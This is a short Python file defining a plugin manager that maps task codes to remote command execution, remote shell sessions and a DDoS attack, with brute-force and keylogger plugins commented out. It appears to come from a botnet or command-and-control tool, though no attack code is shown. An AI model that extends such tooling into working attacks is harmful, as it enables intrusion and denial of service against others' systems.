#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

from app.models import *


class PluginManager:
    def __init__(self):
        self.plugins = {
            'cmd': tools.Command,
            'rsh': tools.RemoteShellSession,
            'dos': attacks.DDosAttack  #,
            #'brt': attacks.BruteForceAttack,

            #'klg': tools.Keylogger
        }

    def get_plugin(self, task_type):
        Plugin = None
        for plugin in self.plugins:
            if task_type == plugin:
                Plugin = self.plugins[plugin]
                break
        return Plugin
